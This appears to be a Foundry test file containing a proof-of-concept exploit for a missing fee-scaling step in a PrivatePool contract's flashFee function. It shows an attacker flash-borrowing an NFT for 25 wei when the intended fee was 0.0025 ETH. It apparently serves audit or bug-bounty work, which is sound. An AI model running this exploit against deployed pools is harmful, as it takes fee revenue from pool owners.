// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

/*
    Exploit PoC for the under–priced flash-loan fee in PrivatePool
    --------------------------------------------------------------
    The pool charges `changeFee` (stored in 4-decimals units) for BOTH
    the “change” operation and flash-loans.  
    For “change” the fee is correctly scaled up by 10^(decimals-4).  
    In `flashFee()` the scaling step is MISSING – the raw value is
    returned instead.  With ETH (18 decimals) the fee is therefore
    1e14 times smaller than intended.

    This test proves that an attacker can:
      • Borrow an NFT via flash-loan,
      • Pay only the tiny, un-scaled fee (25 wei in the example),
      • While the pool owner expected to earn 0.0025 ETH.

    If the bug is fixed (i.e. flashFee starts returning the scaled
    amount) this PoC will revert because the attacker will not send
    enough ETH.
*/

import "forge-std/Test.sol";
import {PrivatePool}  from "src/PrivatePool.sol";
import {IERC3156FlashBorrower} from "openzeppelin/interfaces/IERC3156FlashBorrower.sol";
import {ERC721, ERC721TokenReceiver} from "solmate/tokens/ERC721.sol";

/*//////////////////////////////////////////////////////////////
                              Mocks
//////////////////////////////////////////////////////////////*/

contract MockNFT is ERC721 {
    uint256 public constant ONE_NFT_PRICE = 0.1 ether;

    constructor() ERC721("MockNFT", "MNFT") {}

    function mint(address to, uint256 id) external {
        _safeMint(to, id);
    }

    // solhint-disable-next-line func-name-mixedcase
    function tokenURI(uint256) public pure override returns (string memory) {
        return "";
    }
}

/**
 * @dev Simple flash-loan receiver that:
 *      1. Approves the pool to pull back the NFT.
 *      2. Returns the required magic value.
 */
contract MockBorrower is IERC3156FlashBorrower, ERC721TokenReceiver {
    address public immutable pool;

    constructor(address _pool) {
        pool = _pool;
    }

    function onFlashLoan(
        address,          /* initiator */
        address token,
        uint256 id,
        uint256,          /* fee */
        bytes calldata    /* data */
    ) external override returns (bytes32) {
        // Approve the pool so it can pull back the NFT.
        ERC721(token).approve(pool, id);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    // Required to receive ERC-721s.
    function onERC721Received(
        address, address, uint256, bytes calldata
    ) external pure override returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

/*//////////////////////////////////////////////////////////////
                         Exploit Test
//////////////////////////////////////////////////////////////*/

contract UnderPricedFlashFeeTest is Test {
    address internal attacker = vm.addr(1);

    PrivatePool internal pool;
    MockNFT     internal nft;
    MockBorrower internal borrower;

    uint56 internal constant CHANGE_FEE = 25;      // 0.0025 ETH intended
    uint256 internal constant TOKEN_ID  = 1;

    function setUp() public {
        vm.deal(attacker, 10 ether);

        // Deploy NFT and mint tokenId 1 directly to the soon-to-be pool.
        nft = new MockNFT();

        // Deploy the pool with dummy addresses for factory / registry / oracle.
        pool = new PrivatePool(
            address(0xFACADE),   // factory (not used in flash-loan path)
            address(0xDEAD),     // royalty registry
            address(0xBEEF)      // stolen NFT oracle
        );

        // Initialise the pool.
        pool.initialize(
            address(0),              // base token == ETH
            address(nft),            // NFT address
            0,                       // virtualBaseTokenReserves
            1e18,                    // virtualNftReserves (non-zero)
            CHANGE_FEE,              // changeFee (4 decimals)
            0,                       // trading feeRate (bps)
            bytes32(0),              // merkle root
            false,                   // use stolen NFT oracle
            false                    // pay royalties
        );

        // Mint the NFT directly to the pool so it can be flash-loaned.
        nft.mint(address(pool), TOKEN_ID);

        // Deploy borrower contract.
        borrower = new MockBorrower(address(pool));
    }

    function testExploitUnderpricedFlashLoan() public {
        // Calculate the intended fee if the scaling were correct.
        uint256 scaledExpectedFee = uint256(CHANGE_FEE) * 1e14; // 0.0025 ETH

        // The attacker will deliberately under-pay with ONLY 25 wei.
        uint256 tinyFee = uint256(CHANGE_FEE); // 25 wei

        vm.startPrank(attacker);
        bool ok = pool.flashLoan{value: tinyFee}(
            IERC3156FlashBorrower(address(borrower)),
            address(nft),
            TOKEN_ID,
            ""
        );
        vm.stopPrank();

        assertTrue(ok, "Flash-loan failed unexpectedly");

        // Pool only received 25 wei – far less than the intended 0.0025 ETH.
        assertEq(
            address(pool).balance,
            tinyFee,
            "Pool balance should equal the tiny fee paid"
        );

        assertLt(
            address(pool).balance,
            scaledExpectedFee,
            "Bug not reproducible - borrower paid full scaled fee"
        );
    }
}